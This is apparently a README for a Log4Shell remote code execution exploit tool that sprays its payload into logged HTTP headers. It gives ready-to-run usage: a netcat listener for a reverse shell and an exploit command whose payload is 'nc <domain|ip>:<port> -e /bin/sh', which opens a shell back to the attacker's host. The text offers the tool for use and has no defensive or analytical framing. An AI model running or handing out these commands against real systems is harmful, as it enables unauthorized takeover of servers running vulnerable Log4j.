## Log4Shell RCE Exploit 

[![asciicast](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj.svg)](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj)

fully independent exploit does not require any 3rd party binaries.
The exploit spraying the payload to all possible logged HTTP Headers such as `X-Forwarding , Server-IP , User-Agent` 
### Usage
reverse shell receiver
```
nc -lvp <port>
```

exploit execution
```shell
python main.py -i lhost -u http://target:targetport -c "nc <domain|ip>:<port> -e /bin/sh" -p lhttp_port -l lldap_port
 ```


### Requirements 
- java-8-openjdk
- pip install -r requirements.txt
- python3.6+
